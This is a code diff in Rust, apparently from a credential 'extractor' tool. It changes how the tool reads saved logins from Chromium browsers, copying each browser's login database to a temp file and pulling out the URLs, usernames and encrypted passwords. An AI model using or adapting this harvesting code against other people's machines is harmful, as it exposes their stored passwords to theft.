@@ -18,6 +18,8 @@ use super::Credential;
 
 use crate::error::{ExtractorError, ExtractorResult};
 
+const TEMP_FILE: &str = "chromium.data";
+
 #[derive(Deserialize)]
 pub struct LocalState {
     #[cfg(target_os = "windows")]
@@ -51,28 +53,34 @@ pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
             continue;
         }
 
-        let login_data = Connection::open_with_flags(
-            dir,
-            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
-        )?;
+        std::fs::copy(&dir, TEMP_FILE)?;
 
-        let mut stmt = login_data
-            .prepare_cached("SELECT origin_url, username_value, password_value FROM logins")?;
+        {
+            let login_data = Connection::open_with_flags(
+                TEMP_FILE,
+                OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
+            )?;
 
-        let mut rows = stmt.query([])?;
+            let mut stmt = login_data
+                .prepare_cached("SELECT origin_url, username_value, password_value FROM logins")?;
 
-        while let Some(row) = rows.next()? {
-            let origin_url = row.get::<_, String>(0)?;
-            let username_value = row.get::<_, String>(1)?;
-            let password_value = row.get::<_, Vec<u8>>(2)?;
+            let mut rows = stmt.query([])?;
 
-            credentials.push(Credential {
-                browser: browser.name.to_string(),
-                url: origin_url,
-                username: username_value,
-                encrypted_password: password_value,
-            });
+            while let Some(row) = rows.next()? {
+                let origin_url = row.get::<_, String>(0)?;
+                let username_value = row.get::<_, String>(1)?;
+                let password_value = row.get::<_, Vec<u8>>(2)?;
+
+                credentials.push(Credential {
+                    browser: browser.name.to_string(),
+                    url: origin_url,
+                    username: username_value,
+                    encrypted_password: password_value,
+                });
+            }
         }
+
+        std::fs::remove_file(TEMP_FILE)?;
     }
 
     Ok(credentials)
